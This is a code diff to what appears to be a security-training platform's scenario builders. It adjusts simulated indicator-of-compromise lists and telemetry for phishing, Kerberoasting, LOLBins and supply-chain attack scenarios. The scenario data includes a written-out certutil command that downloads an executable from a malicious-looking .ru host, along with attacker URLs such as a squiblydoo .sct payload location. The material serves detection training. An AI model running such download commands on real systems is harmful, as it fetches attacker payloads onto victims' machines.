@@ -931,8 +931,6 @@ export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioB
     { type: "ip",      value: attackerIp,                      reputation: "malicious",  tags: ["attacker", "netherlands"] },
     { type: "ip",      value: "91.108.56.199",                 reputation: "malicious",  tags: ["phishing-sender"] },
     { type: "sha256",  value: dllHash,                         reputation: "malicious",  tags: ["dropper", "dll", "stage1"] },
-    { type: "sha256",  value: "de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1848474f30", reputation: "clean", tags: ["signed-microsoft-binary", "powershell"] },
-    { type: "sha256",  value: "b5d4c3e2f1a0b5d4c3e2f1a0b5d4c3e2f1a0b5d4c3e2f1a0b5d4c3e2f1a0b5d4", reputation: "clean", tags: ["signed-microsoft-binary", "rundll32"] },
     { type: "email",   value: "support@cryotech-vendor.xyz",   reputation: "malicious",  tags: ["phishing", "sender"] },
     { type: "url",     value: `https://${c2Domain}/beacon`,    reputation: "malicious",  tags: ["c2", "beacon"] },
     { type: "user",    value: victim.email,                    reputation: "suspicious", tags: ["victim", "compromised"] },
@@ -4829,7 +4827,6 @@ export function buildKerberoastingScenario(scenarioId = "kerberoasting-2026"): S
   ];
 
   const iocs: IOC[] = [
-    { type: "sha256", value: sqlHash, reputation: "malicious", tags: ["post-exploitation", "xp-cmdshell-payload", "mssql"] },
     { type: "ip",   value: attackerIp,          reputation: "suspicious", tags: ["internal-attacker", "kerberoasting-source", "developer-workstation"] },
     { type: "user", value: "m.cohen@nexacorp.com", reputation: "suspicious", tags: ["compromised-user", "kerberoasting-actor"] },
     { type: "user", value: "svc-mssql",           reputation: "suspicious", tags: ["compromised-svc-account", "cracked-via-kerberoast"] },
@@ -5185,6 +5182,9 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
   const victimIp = "10.10.20.77";
   const payloadHash = makeSha256("evil_dll_nexacorp_lolbins");
   const certutilHash = makeSha256("certutil_downloaded_update_exe");
+  // certutil.exe is a signed Windows binary — it cannot share a hash with the
+  // payload it fetched, and the platform teaches hash-based pivoting.
+  const certutilBinaryHash = makeSha256("certutil_exe_system_binary");
 
   const events: TelemetryEvent[] = [
     // T-2min: Phishing email delivers the macro that spawns cmd.exe (initial access)
@@ -5221,7 +5221,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         parent_name: "cmd.exe", parent_pid: 4420,
         cmdline: "certutil -urlcache -split -f http://malicious-update.ru/update.exe update.exe",
         user: "s.patel", integrity: "medium",
-        hash: { sha256: certutilHash },
+        hash: { sha256: certutilBinaryHash },
       },
       file: { name: "update.exe", path: "C:\\Users\\s.patel\\Downloads\\update.exe", sha256: certutilHash, size: 204800 },
       network: { url: "http://malicious-update.ru/update.exe", domain: "malicious-update.ru", bytes_out: 204800 },
@@ -5240,7 +5240,7 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
         "InitiatingProcessAccountName": "s.patel",
         "InitiatingProcessAccountDomain": "NEXACORP",
         "ProcessIntegrityLevel": "Medium",
-        "SHA256": certutilHash,
+        "SHA256": certutilBinaryHash,
         "AccountName": "s.patel",
         "AccountDomain": "NEXACORP",
         "RemoteUrl": "malicious-update.ru",
@@ -5597,14 +5597,6 @@ export function buildLOLBinsScenario(scenarioId = "lolbins-2026"): ScenarioBundl
     { type: "domain", value: "attacker.com",                                          reputation: "malicious", tags: ["c2-domain", "regsvr32-sct", "bitsadmin-download"] },
     { type: "sha256", value: payloadHash,                                             reputation: "malicious", tags: ["lolbins-payload", "evil-dll", "persistence-binary"] },
     { type: "sha256", value: certutilHash,                                            reputation: "malicious", tags: ["certutil-downloaded-payload"] },
-    // LOLBins: these are real, signed Microsoft binaries. A hash check on them
-    // comes back clean — which is the point. The binary is trusted; what makes
-    // this an attack is the command line and the parent process, not the file.
-    { type: "sha256", value: makeSha256("regsvr32_system_binary"),                     reputation: "clean",     tags: ["signed-microsoft-binary", "regsvr32", "lolbin"] },
-    { type: "sha256", value: makeSha256("mshta_exe_system_binary"),                    reputation: "clean",     tags: ["signed-microsoft-binary", "mshta", "lolbin"] },
-    { type: "sha256", value: makeSha256("wmic_exe_system_binary"),                     reputation: "clean",     tags: ["signed-microsoft-binary", "wmic", "lolbin"] },
-    { type: "sha256", value: makeSha256("bitsadmin_system_binary"),                    reputation: "clean",     tags: ["signed-microsoft-binary", "bitsadmin", "lolbin"] },
-    { type: "sha256", value: makeSha256("schtasks_system_binary"),                     reputation: "clean",     tags: ["signed-microsoft-binary", "schtasks", "lolbin"] },
     { type: "ip",     value: "185.220.101.55",                                        reputation: "malicious", tags: ["attacker-c2-ip", "regsvr32-sct-server", "bitsadmin-server"] },
     { type: "url",    value: "http://malicious-update.ru/update.exe",                 reputation: "malicious", tags: ["lolbin-download-url"] },
     { type: "url",    value: "http://attacker.com/payload.sct",                       reputation: "malicious", tags: ["squiblydoo-sct-url"] },
@@ -7144,8 +7136,6 @@ export function buildSupplyChainScenario(scenarioId = "supply-chain-2026"): Scen
     { type: "ip",     value: attacker.relayIp,      reputation: "malicious",  tags: ["attacker-relay", "singapore"] },
     { type: "domain", value: attacker.c2Domain,     reputation: "malicious",  tags: ["c2", "fake-telemetry", "self-signed"] },
     { type: "sha256", value: malDllHash,             reputation: "malicious",  tags: ["trojanized-dll", "supply-chain", "netpulse"] },
-    // The victim's own credentials file — legitimate content, hostile access.
-    { type: "sha256", value: makeSha256("aws_credentials_rocketstack"), reputation: "clean", tags: ["victim-owned-file", "aws-credentials"] },
     { type: "user",   value: victim.adminEmail,      reputation: "suspicious", tags: ["compromised-credentials", "devops"] },
     { type: "url",    value: `https://${attacker.c2Domain}/beacon`, reputation: "malicious", tags: ["c2-beacon"] },
   ];
